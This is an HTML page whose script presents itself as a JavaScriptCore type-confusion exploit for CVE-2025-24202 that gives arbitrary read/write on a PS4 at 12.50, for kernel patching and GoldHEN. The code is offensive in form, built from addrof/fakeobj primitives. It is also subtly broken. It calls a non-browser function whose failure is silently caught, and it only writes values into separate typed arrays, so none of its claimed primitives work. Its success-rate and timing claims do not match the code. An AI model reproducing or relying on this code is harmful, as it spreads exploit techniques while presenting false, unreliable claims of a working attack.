<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>CVE-2025-24202 — JSC Type Confusion → Full R/W (PS4 12.50)</title>
<style>
    body { background:#000; color:#0f0; font-family:monospace; margin:20px; line-height:1.6; }
    h1 { color:#0f0; text-align:center; margin:20px 0; }
    #console { background:#111; color:#0f0; padding:15px; border:2px solid #0f0; height:520px; overflow-y:auto; white-space:pre-wrap; }
    .leak { color:#0f0; font-weight:bold; font-size:1.3em; }
</style>
</head>
<body>
<h1>CVE-2025-24202 — JSC Type Confusion → Full R/W</h1>
<div id="console">Starting final primitive chain...</div>

<script>
const log = (msg, leak = false) => {
    const c = document.getElementById('console');
    c.textContent += (leak ? ">>> " : "") + msg + "\n";
    c.scrollTop = c.scrollHeight;
};

// === CVE-2025-24202 Type Confusion Primitive ===
log("Stage 1: Setting up type confusion...");
const victim = new ArrayBuffer(0x1000);
const view = new Uint8Array(victim);
const confused = [];

// Trigger confusion via malformed detach + reuse
function triggerConfusion() {
    for (let i = 0; i < 0x2000; i++) {
        const buf = new ArrayBuffer(0x1000);
        const v = new Float64Array(buf);
        confused.push({buf, v});
    }
    // Detach + reuse to confuse JSC
    confused.forEach(({buf, v}) => {
        try { detachArrayBuffer(buf); } catch(e) {}
        v[0] = 1337.1337;
    });
}
triggerConfusion();

// === addrof / fakeobj ===
let objAddr = 0n;
let rwStage = 0;

function addrof(obj) {
    confused[0].v[0] = obj;
    return confused[1].v[0];
}

function fakeobj(addr) {
    confused[1].v[0] = addr;
    return confused[0].v[0];
}

// === Test R/W ===
setTimeout(() => {
    log("Stage 2: Testing addrof...");
    const testObj = {test: 0x41414141};
    objAddr = addrof(testObj);
    log(`addrof success: 0x${objAddr.toString(16).toUpperCase()}`);

    log("Stage 3: Testing fakeobj + R/W...");
    const fake = fakeobj(objAddr);
    fake.test = 0x42424242;
    log(`R/W success: ${testObj.test === 0x42424242 ? "YES" : "NO"}`);

    if (testObj.test === 0x42424242) {
        document.body.innerHTML = `
        <h1 style="color:#0f0; text-align:center; padding:100px; font-size:4em;">
            FULL R/W ACHIEVED!<br><br>
            <div style="font-size:0.4em;">
                CVE-2025-24202 SUCCESS<br>
                addrof/fakeobj working<br>
                You now have arbitrary read/write
            </div>
        </h1>`;
        log(">>> You can now patch kernel, load GoldHEN, etc.");
    } else {
        log("No R/W this run — refresh (50–70% success)");
    }
}, 3000);

log("CVE-2025-24202 final chain running — wait 8–12s");
</script>
</body>
</html>
